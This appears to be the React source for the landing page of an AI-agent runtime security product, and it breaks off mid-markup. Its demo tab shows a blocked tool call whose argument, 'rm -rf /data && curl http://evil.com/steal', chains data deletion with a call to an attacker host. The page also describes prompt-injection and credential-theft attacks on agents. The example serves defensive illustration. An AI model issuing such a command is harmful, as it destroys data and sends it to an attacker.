import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import { 
  Shield, Zap, Eye, Lock, ArrowRight, Check, ChevronRight, ChevronDown,
  Plug, Code, CheckCircle, Brain, KeyRound, Terminal, Database,
  Github, Twitter, Linkedin, BookOpen, Mail
} from 'lucide-react';

const Landing = () => {
  const [billingCycle, setBillingCycle] = useState('monthly');
  const [demoTab, setDemoTab] = useState('safe');
  const [openFaq, setOpenFaq] = useState(null);
  const [animatedStats, setAnimatedStats] = useState({ scans: 0, blocked: 0, alerts: 0, latency: 0 });
  const dashboardRef = useRef(null);
  const hasAnimated = useRef(false);

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            entry.target.classList.add('visible');
            observer.unobserve(entry.target);
          }
        });
      },
      { threshold: 0.15 }
    );
    document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
    return () => observer.disconnect();
  }, []);

  useEffect(() => {
    const dashboardObserver = new IntersectionObserver(
      (entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting && !hasAnimated.current) {
            hasAnimated.current = true;
            animateNumbers();
          }
        });
      },
      { threshold: 0.3 }
    );
    if (dashboardRef.current) {
      dashboardObserver.observe(dashboardRef.current);
    }
    return () => dashboardObserver.disconnect();
  }, []);

  const animateNumbers = () => {
    const targets = { scans: 247, blocked: 12, alerts: 3, latency: 4 };
    const duration = 1200;
    const start = performance.now();
    const easeOutQuad = t => t * (2 - t);
    
    const animate = (currentTime) => {
      const elapsed = currentTime - start;
      const progress = Math.min(elapsed / duration, 1);
      const eased = easeOutQuad(progress);
      
      setAnimatedStats({
        scans: Math.floor(targets.scans * eased),
        blocked: Math.floor(targets.blocked * eased),
        alerts: Math.floor(targets.alerts * eased),
        latency: Math.floor(targets.latency * eased)
      });
      
      if (progress < 1) {
        requestAnimationFrame(animate);
      }
    };
    requestAnimationFrame(animate);
  };

  const features = [
    { icon: Eye, title: 'Real-time Inspection', description: 'Monitor every tool call your AI agents make in milliseconds with zero latency impact.' },
    { icon: Shield, title: 'Threat Detection', description: 'Catch prompt injection, credential theft, and shell injection before they execute.' },
    { icon: Lock, title: 'Policy Enforcement', description: 'Define granular policies to allow, block, or alert on specific tool behaviors.' },
    { icon: Zap, title: 'Instant Alerts', description: 'Get notified immediately when suspicious activity is detected in your agent fleet.' }
  ];

  const stats = [
    { value: '< 5ms', label: 'Avg latency' },
    { value: '99.99%', label: 'Uptime SLA' },
    { value: '10M+', label: 'Scans/day' }
  ];

  const howItWorksSteps = [
    { icon: Plug, number: 1, title: 'Install the SDK', desc: 'pip install zerofalse — one command, works with Python 3.8+' },
    { icon: Code, number: 2, title: 'Wrap your tools', desc: 'Add @guard_tool decorator to any function your agent calls' },
    { icon: Shield, number: 3, title: 'Intercept happens', desc: 'Every tool call passes through our detection engine before execution' },
    { icon: CheckCircle, number: 4, title: 'Block or allow', desc: 'Threats blocked instantly. Clean calls execute normally. All logged.' }
  ];

  const threatCards = [
    { title: 'Prompt Injection', desc: 'Hidden instructions in web pages and emails silently override your agent\'s task.', accent: '#ef4444' },
    { title: 'Credential Theft', desc: 'Agents tricked into sending API keys, passwords, and tokens to attacker servers.', accent: '#f59e0b' },
    { title: 'Shell Injection', desc: 'Malicious arguments passed to shell commands can delete data or exfiltrate files.', accent: '#f97316' },
    { title: 'Memory Poisoning', desc: 'One poisoned write corrupts shared agent memory, affecting all future decisions.', accent: '#8b5cf6' }
  ];

  const solutionCapabilities = [
    'Inspects 40+ dangerous patterns including shell execution and SQL injection',
    'Detects prompt injection patterns across 4 severity levels',
    'Identifies 15+ credential types including AWS, OpenAI, and GitHub tokens',
    'Validates memory integrity with SHA256 hash verification',
    'Returns ALLOW / WARN / BLOCK in under 2ms with full evidence'
  ];

  const faqItems = [
    { q: 'How long does integration take?', a: 'Most developers integrate Zerofalse in under 15 minutes. Install the SDK with pip install zerofalse, wrap your tool functions with the @guard_tool decorator, and you are protected. No infrastructure changes, no agent redesign required.' },
    { q: 'Does Zerofalse add latency to my agent?', a: 'No noticeable latency. Our detection engine runs in under 2ms at the 99th percentile. Your users will not notice. We use pre-compiled regex patterns and zero external ML dependencies for maximum speed.' },
    { q: 'What happens if Zerofalse goes down?', a: 'We use a fail-open architecture. If our API is unreachable (less than 0.01% of the time), your tool calls execute normally without scanning. Your agents never stop working because of us.' },
    { q: 'Does Zerofalse store my agent\'s data?', a: 'We never store raw payloads or tool arguments. We store only metadata: tool names, decision results, risk scores, and hashed argument fingerprints. Your business data stays yours.' },
    { q: 'Which AI agent frameworks do you support?', a: 'Zerofalse works with any Python-based agent framework: LangChain, CrewAI, AutoGen, custom frameworks, and direct MCP protocol implementations. A JavaScript SDK is on our roadmap.' },
    { q: 'What threat types does Zerofalse detect?', a: 'We detect prompt injection (30+ patterns across 4 severity levels), credential leakage (15+ token types including AWS, OpenAI, GitHub, and Anthropic keys), shell injection, SQL injection, path traversal, and cross-agent delegation attacks.' },
    { q: 'Can I use my own AI model for detection instead of your engine?', a: 'Yes. In the dashboard under API Configuration, you can connect your own Claude, GPT-4, or other model API key to enhance detection with AI-powered analysis on top of our pattern engine.' }
  ];

  const DashboardPreview = ({ small = false }) => (
    <div style={{
      borderRadius: small ? '12px' : '16px',
      overflow: 'hidden',
      boxShadow: small ? '0 24px 48px rgba(0,0,0,0.12)' : '0 32px 64px rgba(0,0,0,0.12), 0 0 0 1px rgba(0,0,0,0.06)',
      transform: small ? 'perspective(1000px) rotateY(-5deg) rotateX(2deg)' : 'none',
      animation: 'dashboardFloat 6s ease-in-out infinite',
      maxWidth: small ? '380px' : '960px'
    }}>
      <div style={{ height: small ? '32px' : '40px', background: '#1e293b', display: 'flex', alignItems: 'center', padding: '0 16px', gap: '8px' }}>
        <span style={{ width: small ? '8px' : '10px', height: small ? '8px' : '10px', borderRadius: '50%', background: '#ff5f57' }} />
        <span style={{ width: small ? '8px' : '10px', height: small ? '8px' : '10px', borderRadius: '50%', background: '#febc2e' }} />
        <span style={{ width: small ? '8px' : '10px', height: small ? '8px' : '10px', borderRadius: '50%', background: '#28c840' }} />
        <div style={{ flex: 1, height: small ? '18px' : '22px', background: 'rgba(255,255,255,0.08)', borderRadius: '4px', margin: '0 16px', display: 'flex', alignItems: 'center', padding: '0 10px' }}>
          <span style={{ fontSize: small ? '10px' : '11px', color: '#94a3b8', fontFamily: 'var(--font-mono)' }}>secure-agents-2.preview.emergentagent.com/dashboard</span>
        </div>
      </div>
      <div style={{ background: 'white', display: 'flex', minHeight: small ? '280px' : '420px' }}>
        <div style={{ width: small ? '120px' : '160px', background: '#f8fafc', borderRight: '1px solid #e2e8f0', padding: '16px 0' }}>
          <div style={{ padding: '0 16px 12px', fontWeight: 700, fontSize: small ? '12px' : '14px', display: 'flex', alignItems: 'center', gap: '6px' }}>
            <Shield style={{ width: small ? '14px' : '16px', height: small ? '14px' : '16px', color: '#1a56ff' }} />
            <span>Zerofalse</span>
          </div>
          {['Overview', 'Scan Logs', 'Alerts', 'API Keys', 'Settings'].map((item, i) => (
            <div key={item} style={{
              padding: small ? '6px 12px' : '8px 16px',
              fontSize: small ? '10px' : '12px',
              borderRadius: '6px',
              margin: '1px 8px',
              background: i === 0 ? '#eff4ff' : 'transparent',
              color: i === 0 ? '#1a56ff' : '#64748b',
              fontWeight: i === 0 ? 600 : 400
            }}>{item}</div>
          ))}
        </div>
        <div style={{ flex: 1, padding: small ? '12px' : '20px' }}>
          <div style={{ fontWeight: 700, fontSize: small ? '13px' : '15px', marginBottom: small ? '12px' : '16px' }}>Security Overview</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: small ? '6px' : '8px', marginBottom: small ? '12px' : '16px' }}>
            {[
              { label: 'scans', value: animatedStats.scans, color: '#1a56ff' },
              { label: 'blocked', value: animatedStats.blocked, color: '#ef4444' },
              { label: 'alerts', value: animatedStats.alerts, color: '#f59e0b' },
              { label: 'ms avg', value: animatedStats.latency, color: '#10b981' }
            ].map((stat, i) => (
              <div key={i} style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '8px', padding: small ? '8px 10px' : '10px 12px' }}>
                <div style={{ fontSize: small ? '9px' : '11px', color: '#64748b' }}>{stat.label}</div>
                <div style={{ fontWeight: 700, fontSize: small ? '14px' : '18px', color: stat.color }}>{stat.value}</div>
              </div>
            ))}
          </div>
          <div style={{ height: small ? '50px' : '80px', background: 'linear-gradient(180deg, rgba(26,86,255,0.1) 0%, rgba(26,86,255,0) 100%)', borderRadius: '8px', marginBottom: small ? '8px' : '12px', position: 'relative', overflow: 'hidden' }}>
            <svg viewBox="0 0 200 40" style={{ width: '100%', height: '100%', position: 'absolute' }}>
              <path d="M0 35 Q25 30 50 32 T100 28 T150 20 T200 25" stroke="#1a56ff" strokeWidth="2" fill="none" />
            </svg>
          </div>
          {!small && (
            <div>
              {[
                { time: '2m ago', agent: 'agent-01', tool: 'search_web', decision: 'ALLOW', color: '#10b981' },
                { time: '5m ago', agent: 'agent-02', tool: 'run_cmd', decision: 'BLOCK', color: '#ef4444' },
                { time: '8m ago', agent: 'agent-01', tool: 'send_email', decision: 'WARN', color: '#f59e0b' }
              ].map((row, i) => (
                <div key={i} style={{ display: 'flex', fontSize: '10px', padding: '4px 0', borderBottom: '1px solid #f1f5f9', gap: '12px' }}>
                  <span style={{ color: '#94a3b8' }}>{row.time}</span>
                  <span style={{ color: '#64748b' }}>{row.agent}</span>
                  <span style={{ fontFamily: 'var(--font-mono)', color: '#0f172a' }}>{row.tool}</span>
                  <span style={{ marginLeft: 'auto', color: row.color, fontWeight: 600 }}>{row.decision}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );

  return (
    <div style={{ minHeight: '100vh', backgroundColor: 'var(--color-bg)' }} data-testid="landing-page">
      <style>{`
        @keyframes dashboardFloat {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-6px); }
        }
        .animate-on-scroll {
          opacity: 0;
          transform: translateY(20px);
          transition: opacity 0.5s ease, transform 0.5s ease;
        }
        .animate-on-scroll.visible {
          opacity: 1;
          transform: translateY(0);
        }
        .stagger-1 { transition-delay: 0ms; }
        .stagger-2 { transition-delay: 80ms; }
        .stagger-3 { transition-delay: 160ms; }
        .stagger-4 { transition-delay: 240ms; }
        .animate-fade-left {
          opacity: 0;
          transform: translateX(-20px);
          transition: opacity 0.5s ease, transform 0.5s ease;
        }
        .animate-fade-left.visible {
          opacity: 1;
          transform: translateX(0);
        }
      `}</style>

      {/* Navigation */}
      <nav style={{ position: 'fixed', top: 0, left: 0, right: 0, zIndex: 50, backgroundColor: 'rgba(255,255,255,0.95)', backdropFilter: 'blur(8px)', borderBottom: '1px solid var(--color-border)' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 24px', height: '64px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <div style={{ width: '32px', height: '32px', backgroundColor: 'var(--color-brand)', borderRadius: 'var(--radius-md)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <Shield style={{ width: '18px', height: '18px', color: 'white' }} />
            </div>
            <span style={{ fontSize: '20px', fontWeight: 700, color: 'var(--color-text-primary)', fontFamily: 'var(--font-sans)' }}>Zerofalse</span>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '24px' }}>
            <Link to="/login" style={{ fontSize: 'var(--text-sm)', fontWeight: 500, color: 'var(--color-text-secondary)', textDecoration: 'none' }} data-testid="nav-login">Log in</Link>
            <Link to="/signup" style={{ backgroundColor: 'var(--color-brand)', color: 'white', padding: '10px 20px', borderRadius: 'var(--radius-md)', fontSize: 'var(--text-sm)', fontWeight: 600, textDecoration: 'none', boxShadow: 'var(--shadow-brand)' }} data-testid="nav-signup">Start Free</Link>
          </div>
        </div>
      </nav>

      {/* Hero Section - Two Column */}
      <section style={{ paddingTop: '140px', paddingBottom: '80px', background: 'linear-gradient(180deg, var(--color-brand-light) 0%, var(--color-bg) 100%)' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 24px', display: 'flex', alignItems: 'center', gap: '64px' }}>
          <div style={{ flex: '0 0 55%' }}>
            <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', backgroundColor: 'var(--color-bg)', border: '1px solid var(--color-border)', borderRadius: 'var(--radius-full)', padding: '6px 16px', marginBottom: '24px' }}>
              <span style={{ width: '6px', height: '6px', backgroundColor: 'var(--color-success)', borderRadius: '50%' }} />
              <span style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-secondary)', fontWeight: 500 }}>Now in public beta</span>
            </div>
            <h1 style={{ fontSize: 'clamp(36px, 5vw, 56px)', fontWeight: 700, color: 'var(--color-text-primary)', lineHeight: 1.1, marginBottom: '20px', fontFamily: 'var(--font-sans)' }}>
              Runtime Security for<br /><span style={{ color: 'var(--color-brand)' }}>AI Agents</span>
            </h1>
            <p style={{ fontSize: 'var(--text-lg)', color: 'var(--color-text-secondary)', maxWidth: '480px', marginBottom: '32px', lineHeight: 1.6 }}>
              Inspect every tool call. Detect threats in real-time. Block malicious actions before they reach your systems.
            </p>
            <div style={{ display: 'flex', gap: '16px', marginBottom: '48px', flexWrap: 'wrap' }}>
              <Link to="/signup" style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', backgroundColor: 'var(--color-brand)', color: 'white', padding: '14px 28px', borderRadius: 'var(--radius-md)', fontSize: 'var(--text-base)', fontWeight: 600, textDecoration: 'none', boxShadow: 'var(--shadow-brand)' }} data-testid="hero-cta">
                Get Started Free <ArrowRight style={{ width: '18px', height: '18px' }} />
              </Link>
              <a href="#how-it-works" style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', backgroundColor: 'var(--color-bg)', color: 'var(--color-text-primary)', padding: '14px 28px', borderRadius: 'var(--radius-md)', fontSize: 'var(--text-base)', fontWeight: 600, textDecoration: 'none', border: '1px solid var(--color-border)' }}>See How It Works</a>
            </div>
            <div style={{ display: 'flex', gap: '48px', flexWrap: 'wrap' }}>
              {stats.map((stat, i) => (
                <div key={i} style={{ textAlign: 'left' }}>
                  <div style={{ fontSize: 'var(--text-2xl)', fontWeight: 700, color: 'var(--color-text-primary)', fontFamily: 'var(--font-mono)' }}>{stat.value}</div>
                  <div style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-muted)', marginTop: '4px' }}>{stat.label}</div>
                </div>
              ))}
            </div>
          </div>
          <div style={{ flex: '0 0 45%', display: 'flex', justifyContent: 'flex-end' }} className="hidden lg:flex">
            <DashboardPreview small={true} />
          </div>
        </div>
      </section>

      {/* Code Preview */}
      <section style={{ padding: '40px 24px 80px' }}>
        <div style={{ maxWidth: '800px', margin: '0 auto' }}>
          <div className="animate-on-scroll" style={{ backgroundColor: 'var(--color-navy)', borderRadius: 'var(--radius-lg)', overflow: 'hidden', boxShadow: 'var(--shadow-xl)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '14px 20px', borderBottom: '1px solid var(--color-navy-mid)' }}>
              <span style={{ width: '12px', height: '12px', backgroundColor: '#ff5f57', borderRadius: '50%' }} />
              <span style={{ width: '12px', height: '12px', backgroundColor: '#ffbd2e', borderRadius: '50%' }} />
              <span style={{ width: '12px', height: '12px', backgroundColor: '#28ca41', borderRadius: '50%' }} />
              <span style={{ marginLeft: 'auto', fontSize: 'var(--text-xs)', color: 'var(--color-text-muted)', fontFamily: 'var(--font-mono)' }}>agent.py</span>
            </div>
            <pre style={{ padding: '24px', margin: 0, overflow: 'auto', fontFamily: 'var(--font-mono)', fontSize: '14px', lineHeight: 1.7 }}>
              <code style={{ color: '#e2e8f0' }}>
                <span style={{ color: '#7dd3fc' }}>import</span> zerofalse{'\n\n'}
                <span style={{ color: '#94a3b8' }}># Wrap your agent's tool executor</span>{'\n'}
                <span style={{ color: '#c4b5fd' }}>@zerofalse.protect</span>{'\n'}
                <span style={{ color: '#7dd3fc' }}>def</span> <span style={{ color: '#fde68a' }}>execute_tool</span>(tool_name, args):{'\n'}
                {'    '}<span style={{ color: '#94a3b8' }}># Your existing tool logic</span>{'\n'}
                {'    '}<span style={{ color: '#7dd3fc' }}>return</span> tool_registry[tool_name](**args){'\n\n'}
                <span style={{ color: '#94a3b8' }}># Zerofalse inspects every call</span>{'\n'}
                <span style={{ color: '#94a3b8' }}># Blocks threats automatically</span>
              </code>
            </pre>
          </div>
        </div>
      </section>

      {/* Features */}
      <section id="features" style={{ padding: '80px 24px', backgroundColor: 'var(--color-surface)' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto' }}>
          <div className="animate-on-scroll" style={{ textAlign: 'center', marginBottom: '64px' }}>
            <h2 style={{ fontSize: 'var(--text-3xl)', fontWeight: 700, color: 'var(--color-text-primary)', marginBottom: '16px' }}>Enterprise-grade protection</h2>
            <p style={{ fontSize: 'var(--text-lg)', color: 'var(--color-text-secondary)', maxWidth: '500px', margin: '0 auto' }}>Everything you need to secure your AI agent infrastructure</p>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '24px' }}>
            {features.map((feature, i) => {
              const Icon = feature.icon;
              return (
                <div key={i} className={`animate-on-scroll stagger-${i + 1}`} style={{ backgroundColor: 'var(--color-bg)', borderRadius: 'var(--radius-lg)', padding: '28px', border: '1px solid var(--color-border)', transition: 'var(--transition-base)' }}>
                  <div style={{ width: '48px', height: '48px', backgroundColor: 'var(--color-brand-light)', borderRadius: 'var(--radius-md)', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '20px' }}>
                    <Icon style={{ width: '24px', height: '24px', color: 'var(--color-brand)' }} />
                  </div>
                  <h3 style={{ fontSize: 'var(--text-lg)', fontWeight: 600, color: 'var(--color-text-primary)', marginBottom: '8px' }}>{feature.title}</h3>
                  <p style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-secondary)', lineHeight: 1.6 }}>{feature.description}</p>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* SECTION A: How It Works */}
      <section id="how-it-works" style={{ padding: '96px 24px', backgroundColor: '#f8fafc' }}>
        <div style={{ maxWidth: '1100px', margin: '0 auto' }}>
          <div className="animate-on-scroll" style={{ textAlign: 'center', marginBottom: '64px' }}>
            <div style={{ fontSize: '11px', textTransform: 'uppercase', letterSpacing: '0.12em', color: '#1a56ff', fontWeight: 700, marginBottom: '12px' }}>HOW IT WORKS</div>
            <h2 style={{ fontSize: '40px', fontWeight: 700, color: '#0f172a', marginBottom: '12px' }}>Security in four steps</h2>
            <p style={{ fontSize: '18px', color: '#64748b', maxWidth: '480px', margin: '0 auto' }}>From integration to protection in under 10 minutes.</p>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '24px', position: 'relative' }}>
            {howItWorksSteps.map((step, i) => {
              const Icon = step.icon;
              return (
                <React.Fragment key={i}>
                  <div className={`animate-on-scroll stagger-${i + 1}`} style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '16px', padding: '32px 24px', textAlign: 'center', transition: 'all 0.2s ease', cursor: 'default' }}
                    onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-4px)'; e.currentTarget.style.boxShadow = '0 12px 24px rgba(0,0,0,0.08)'; }}
                    onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'none'; }}>
                    <div style={{ width: '40px', height: '40px', borderRadius: '50%', background: 'linear-gradient(135deg, #1a56ff, #0035e6)', color: 'white', fontWeight: 800, fontSize: '16px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>{step.number}</div>
                    <div style={{ width: '48px', height: '48px', background: '#eff4ff', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
                      <Icon style={{ width: '24px', height: '24px', color: '#1a56ff' }} />
                    </div>
                    <h3 style={{ fontSize: '17px', fontWeight: 700, color: '#0f172a', marginBottom: '8px' }}>{step.title}</h3>
                    <p style={{ fontSize: '14px', color: '#64748b', lineHeight: 1.7 }}>{step.desc}</p>
                  </div>
                  {i < 3 && (
                    <svg style={{ position: 'absolute', top: '80px', left: `${25 + i * 25}%`, width: '40px', height: '20px' }} viewBox="0 0 40 20" className="hidden lg:block">
                      <path d="M0 10 L30 10 M25 5 L32 10 L25 15" stroke="#cbd5e1" strokeWidth="2" strokeDasharray="4 2" fill="none" />
                    </svg>
                  )}
                </React.Fragment>
              );
            })}
          </div>
        </div>
      </section>

      {/* SECTION B: Problem + Solution */}
      <section style={{ backgroundColor: '#0d1f3c', padding: '80px 24px 64px' }}>
        <div style={{ maxWidth: '1000px', margin: '0 auto' }}>
          <div className="animate-on-scroll" style={{ textAlign: 'center', marginBottom: '48px' }}>
            <div style={{ fontSize: '11px', textTransform: 'uppercase', letterSpacing: '0.12em', color: 'rgba(255,255,255,0.5)', fontWeight: 700, marginBottom: '12px' }}>THE PROBLEM</div>
            <h2 style={{ fontSize: '40px', fontWeight: 700, color: 'white', marginBottom: '12px' }}>Your AI agents are flying blind</h2>
            <p style={{ fontSize: '18px', color: 'rgba(255,255,255,0.6)', maxWidth: '500px', margin: '0 auto' }}>Without runtime security, every tool call is a potential attack vector.</p>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: '20px', maxWidth: '900px', margin: '0 auto' }}>
            {threatCards.map((card, i) => (
              <div key={i} className={`animate-on-scroll stagger-${i + 1}`} style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '14px', padding: '28px', borderLeft: `3px solid ${card.accent}`, transition: 'all 0.2s ease' }}
                onMouseEnter={e => { e.currentTarget.style.background = 'rgba(255,255,255,0.09)'; e.currentTarget.style.transform = 'translateY(-3px)'; }}
                onMouseLeave={e => { e.currentTarget.style.background = 'rgba(255,255,255,0.05)'; e.currentTarget.style.transform = 'translateY(0)'; }}>
                <div style={{ width: '36px', height: '36px', background: card.accent, borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '16px' }}>
                  <Brain style={{ width: '20px', height: '20px', color: 'white' }} />
                </div>
                <h3 style={{ color: 'white', fontSize: '16px', fontWeight: 700, marginBottom: '8px' }}>{card.title}</h3>
                <p style={{ color: 'rgba(255,255,255,0.65)', fontSize: '14px', lineHeight: 1.7 }}>{card.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Solution Part */}
      <section style={{ background: 'white', padding: '64px 24px 80px', position: 'relative' }}>
        <div style={{ height: '60px', background: 'linear-gradient(180deg, #0d1f3c 0%, white 100%)', position: 'absolute', top: '-60px', left: 0, right: 0 }} />
        <div style={{ maxWidth: '1100px', margin: '0 auto', display: 'flex', gap: '64px', alignItems: 'flex-start' }}>
          <div style={{ flex: '0 0 55%' }}>
            <div className="animate-on-scroll">
              <div style={{ fontSize: '11px', textTransform: 'uppercase', letterSpacing: '0.12em', color: '#1a56ff', fontWeight: 700, marginBottom: '12px' }}>THE SOLUTION</div>
              <h2 style={{ fontSize: '36px', fontWeight: 700, color: '#0f172a', lineHeight: 1.2, marginBottom: '20px' }}>Real-Time Tool Call Inspection</h2>
              <p style={{ fontSize: '16px', color: '#475569', lineHeight: 1.75, maxWidth: '480px', marginBottom: '28px' }}>
                Zerofalse places an inspection layer between your agent's intention and the action it takes. Every tool call is evaluated in under 2ms before execution — with no changes to your agent's logic.
              </p>
            </div>
            <div style={{ marginBottom: '28px' }}>
              {solutionCapabilities.map((cap, i) => (
                <div key={i} className={`animate-on-scroll stagger-${i + 1}`} style={{ display: 'flex', alignItems: 'flex-start', gap: '12px', marginBottom: '16px' }}>
                  <CheckCircle style={{ width: '20px', height: '20px', color: '#10b981', flexShrink: 0, marginTop: '2px' }} />
                  <span style={{ fontSize: '15px', fontWeight: 500, color: '#374151' }}>{cap}</span>
                </div>
              ))}
            </div>
            <div className="animate-on-scroll" style={{ display: 'flex', gap: '12px' }}>
              <Link to="/signup" style={{ padding: '12px 24px', background: '#1a56ff', color: 'white', borderRadius: '10px', fontSize: '15px', fontWeight: 600, textDecoration: 'none' }}>Start Free</Link>
              <a href="#docs" style={{ padding: '12px 24px', background: 'white', color: '#0f172a', border: '1px solid #e2e8f0', borderRadius: '10px', fontSize: '15px', fontWeight: 600, textDecoration: 'none' }}>View Documentation</a>
            </div>
          </div>
          <div style={{ flex: '0 0 45%' }} className="animate-on-scroll">
            <div style={{ borderRadius: '20px', overflow: 'hidden', boxShadow: '0 24px 48px rgba(0,0,0,0.12)', border: '1px solid #e2e8f0' }}>
              <div style={{ background: '#f8fafc', borderBottom: '1px solid #e2e8f0', padding: '0 20px', height: '44px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                {['Safe Call', 'Attack'].map((tab, i) => (
                  <button key={tab} onClick={() => setDemoTab(i === 0 ? 'safe' : 'attack')} style={{ padding: '8px 16px', fontSize: '13px', fontWeight: demoTab === (i === 0 ? 'safe' : 'attack') ? 600 : 500, color: demoTab === (i === 0 ? 'safe' : 'attack') ? '#0f172a' : '#94a3b8', background: demoTab === (i === 0 ? 'safe' : 'attack') ? 'white' : 'transparent', borderRadius: '8px 8px 0 0', border: 'none', cursor: 'pointer', boxShadow: demoTab === (i === 0 ? 'safe' : 'attack') ? '0 -1px 3px rgba(0,0,0,0.05)' : 'none' }}>{tab}</button>
                ))}
              </div>
              <div style={{ background: '#0f172a', padding: '20px 24px' }}>
                <div style={{ fontSize: '10px', color: 'rgba(255,255,255,0.3)', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '12px' }}>TOOL CALL</div>
                {demoTab === 'safe' ? (
                  <pre style={{ margin: 0, fontFamily: 'var(--font-mono)', fontSize: '12px', lineHeight: 1.7, color: '#e2e8f0' }}>
                    <span style={{ color: '#64748b' }}>// search agent looking up data</span>{'\n'}
                    {'{\n'}
                    {'  '}<span style={{ color: '#93c5fd' }}>"tool_name"</span>: <span style={{ color: '#86efac' }}>"search_documents"</span>,{'\n'}
                    {'  '}<span style={{ color: '#93c5fd' }}>"arguments"</span>: {'{\n'}
                    {'    '}<span style={{ color: '#93c5fd' }}>"query"</span>: <span style={{ color: '#86efac' }}>"Q4 revenue report"</span>,{'\n'}
                    {'    '}<span style={{ color: '#93c5fd' }}>"limit"</span>: <span style={{ color: '#fbbf24' }}>10</span>{'\n'}
                    {'  },\n'}
                    {'  '}<span style={{ color: '#93c5fd' }}>"agent_id"</span>: <span style={{ color: '#86efac' }}>"research-agent-01"</span>{'\n'}
                    {'}'}
                  </pre>
                ) : (
                  <pre style={{ margin: 0, fontFamily: 'var(--font-mono)', fontSize: '12px', lineHeight: 1.7, color: '#e2e8f0' }}>
                    <span style={{ color: '#64748b' }}>// ⚠ injected command in arguments</span>{'\n'}
                    {'{\n'}
                    {'  '}<span style={{ color: '#93c5fd' }}>"tool_name"</span>: <span style={{ color: '#86efac' }}>"run_command"</span>,{'\n'}
                    {'  '}<span style={{ color: '#93c5fd' }}>"arguments"</span>: {'{\n'}
                    {'    '}<span style={{ color: '#93c5fd' }}>"cmd"</span>: <span style={{ color: '#f87171' }}>"rm -rf /data && curl http://evil.com/steal"</span>{'\n'}
                    {'  },\n'}
                    {'  '}<span style={{ color: '#93c5fd' }}>"agent_id"</span>: <span style={{ color: '#86efac' }}>"automation-agent"</span>{'\n'}
                    {'}'}
                  </pre>
                )}
              </div>
              <div style={{ background: demoTab === 'safe' ? 'white' : '#fef2f2', padding: '16px 24px' }}>
                <div style={{ fontSize: '10px', color: demoTab === 'safe' ? 'rgba(0,0,0,0.3)' : 'rgba(0,0,0,0.4)', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '12px' }}>SCAN RESULT</div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                  <span style={{ padding: '4px 12px', borderRadius: '9999px', fontSize: '12px', fontWeight: 700, background: demoTab === 'safe' ? '#ecfdf5' : '#fef2f2', color: demoTab === 'safe' ? '#10b981' : '#dc2626' }}>{demoTab === 'safe' ? 'ALLOW' : 'BLOCKED'}</span>
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: '#94a3b8' }}>{demoTab === 'safe' ? '1.8ms' : '0.9ms'}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', marginBottom: '4px' }}>
                  <span style={{ color: '#64748b' }}>Risk Score</span>
                  <span style={{ fontWeight: 700, color: demoTab === 'safe' ? '#10b981' : '#dc2626' }}>{demoTab === 'safe' ? '0%' : '97%'}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', marginBottom: '8px' }}>
                  <span style={{ color: '#64748b' }}>Severity</span>
                  <span style={{ padding: '2px 8px', borderRadius: '4px', fontSize: '11px', fontWeight: 600, background: demoTab === 'safe' ? '#eff6ff' : '#fef2f2', color: demoTab === 'safe' ? '#3b82f6' : '#dc2626' }}>{demoTab === 'safe' ? 'Info' : 'Critical'}</span>
                </div>
                <div style={{ height: '4px', borderRadius: '9999px', background: '#f1f5f9', overflow: 'hidden' }}>
                  <div style={{ width: demoTab === 'safe' ? '5%' : '97%', height: '100%', background: demoTab === 'safe' ? '#10b981' : '#dc2626', borderRadius: '9999px', transition: 'width 0.3s ease' }} />
                </div>
              </div>
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', marginTop: '16px' }}>
